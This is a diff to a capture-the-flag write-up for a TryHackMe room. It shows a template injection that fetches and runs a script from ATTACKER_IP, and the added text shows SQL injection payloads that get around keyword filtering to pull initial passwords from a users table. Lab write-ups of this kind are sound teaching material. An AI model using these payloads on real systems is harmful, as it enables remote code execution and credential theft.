@@ -54,6 +54,9 @@ fname={{['curl+ATTACKER_IP:8000/s+-o+/tmp/s','r']|sort('popen')|join}}
 fname={{['sh+/tmp/s','r']|sort('popen')|join}}
 ```
 
+
+## extracting initial passwords one char at a time
+
 Only after getting access to the source code I was able to understand that some keywords are deleted:  in particular `SELECT` and `OR`.  I was not aware of that because my initial payload did not involve the `OR` keyword.
 
 Keeping this in mind we also have a cool way to extract the initial password from the users table (three characters at a time, or up to 18 characters if using all six ranks available):
@@ -86,5 +89,22 @@ MariaDB [(none)]> select char(50,51,52,50,115,100,115,102,119,102,50,119,114,50,
 
 Password for superadmin is left as an exercise to the reader.
 With some patience we can recover the initial passwords and login without having to drop the users table, or changing the current password, thus being more stealthy!
+
+## extracting initial password via union select
+
+Again, having source code and playing a little bit locally we can also extract initial password from the original login:
+
+```
+POST /functions.php HTTP/1.1
+
+username=a'+ununionion+all+select+1,F.1,F.4,4,5,6+FROM+(SELECT+1,2,3,4,5,6+UunionNION+select+*+FROM+users)F+limit+1,1--+&password=foo&function=login
+```
+
+This becomes
+
+```sql
+'a' union all select 1,F.1,F.4,4,5,6 FROM (SELECT 1,2,3,4,5,6 UNION select * FROM users)F limit 1,1-- 
+```
+
 
 Go here https://tryhackme.com/r/room/injectics to play the room! 
